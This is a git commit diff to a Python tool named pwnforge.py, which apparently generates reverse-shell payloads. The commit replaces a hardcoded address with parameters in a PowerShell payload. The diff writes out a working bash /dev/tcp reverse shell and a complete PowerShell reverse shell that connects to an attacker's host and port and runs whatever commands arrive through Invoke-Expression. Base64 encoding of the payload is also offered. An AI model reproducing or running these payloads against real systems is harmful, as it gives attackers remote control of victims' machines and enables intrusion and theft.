e0f97ff5d9381f95871a4e5b2ac504dd6c08069d
Zeipher <zeipher@localhost.localdomain>
2023-09-15 10:11:13 -0400

    "fixed a bug where ps shell generation wasnt switching host or port number"

--- pwnforge.py
+++ pwnforge.py
@@ -15,7 +15,31 @@ asciiart = """
 def generate_payload(host, port, use_payload2, encode_base64=False):
     if host and port:
         payload1 = f"/bin/bash -i >& /dev/tcp/{host}/{port} 0>&1;"
-        payload2 = '$LHOST = "10.10.14.38"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'
+        payload2 = (
+            f"$LHOST = '{host}'; "
+            f"$LPORT = {port}; "
+            "$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); "
+            "$NetworkStream = $TCPClient.GetStream(); "
+            "$StreamReader = New-Object IO.StreamReader($NetworkStream); "
+            "$StreamWriter = New-Object IO.StreamWriter($NetworkStream); "
+            "$StreamWriter.AutoFlush = $true; "
+            "$Buffer = New-Object System.Byte[] 1024; "
+            "while ($TCPClient.Connected) { "
+            "    while ($NetworkStream.DataAvailable) { "
+            "        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); "
+            "        $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) "
+            "    }; "
+            "    if ($TCPClient.Connected -and $Code.Length -gt 1) { "
+            "        $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; "
+            "        $StreamWriter.Write(\"$Output`n\"); "
+            "        $Code = $null "
+            "    } "
+            "}; "
+            "$TCPClient.Close(); "
+            "$NetworkStream.Close(); "
+            "$StreamReader.Close(); "
+            "$StreamWriter.Close()"
+        )
         selected_payload = payload2 if use_payload2 else payload1
         
         if encode_base64:
